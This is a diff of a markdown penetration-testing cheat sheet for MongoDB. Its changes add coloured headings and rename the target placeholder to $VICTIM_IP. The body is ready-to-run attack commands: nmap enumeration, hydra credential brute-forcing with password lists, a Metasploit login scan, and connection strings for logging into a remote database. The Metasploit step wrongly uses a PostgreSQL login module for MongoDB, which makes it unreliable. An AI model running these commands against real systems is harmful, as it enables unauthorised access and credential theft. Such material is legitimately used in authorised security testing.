@@ -1,22 +1,22 @@
-# Commands
-### Enumeration
+# <span style="color:#FF5555">Commands</span>
+### <span style="color:#50FA7B">Enumeration</span>
 ```bash
-nmap --script mongodb-info -p 27017 <target-ip>
-nmap --script mongodb-databases -p 27017 <target-ip>
+nmap --script mongodb-info -p 27017 $VICTIM_IP
+nmap --script mongodb-databases -p 27017 $VICTIM_IP
 ```
-### Brute Force Credentials
+### <span style="color:#50FA7B">Brute Force Credentials</span>
 ```bash
-hydra -l username -P passwords.txt <target-ip> mongo
-hydra -L usernames.txt -p password <target-ip> mongo
+hydra -l username -P passwords.txt $VICTIM_IP mongo
+hydra -L usernames.txt -p password $VICTIM_IP mongo
 
 # Metasploit
 msfconsole
 msf> use auxiliary/scanner/postgres/postgres_login
-msf> set rhosts <target-ip>
+msf> set rhosts $VICTIM_IP
 msf> run
 ```
 
-### Connect
+### <span style="color:#50FA7B">Connect</span>
 
 ```bash
 # Local
@@ -24,14 +24,14 @@ mongo
 mongo --port 27017
 
 # Remote
-mongo --host <target-ip> --port 27017 -u username -p password
-mongo "mongodb://<target-ip>:27017"
-mongo "mongodb://username:password@<target-ip>:27017/?authSource=admin"
+mongo --host $VICTIM_IP --port 27017 -u username -p password
+mongo "mongodb://$VICTIM_IP:27017"
+mongo "mongodb://username:password@$VICTIM_IP:27017/?authSource=admin"
 
 ```
 
 
-### Basic Commands
+### <span style="color:#50FA7B">Basic Commands</span>
 
 ```bash
 # All databases
